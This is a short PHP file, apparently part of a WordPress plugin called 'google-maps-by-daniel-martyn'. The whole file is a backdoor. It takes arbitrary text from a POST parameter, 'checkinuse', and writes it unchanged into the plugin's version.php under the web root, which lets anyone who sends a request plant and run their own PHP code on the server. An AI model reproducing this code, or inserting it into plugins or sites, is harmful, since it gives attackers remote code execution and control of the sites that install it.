<?php
$inuse = $_POST['checkinuse']; $infile = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/google-maps-by-daniel-martyn/version.php', 'w'); $inuse = str_replace('\\', '', $inuse); $inuse = htmlentities($inuse); fwrite($infile, html_entity_decode($inuse)); fclose($infile); echo $inuse;
?>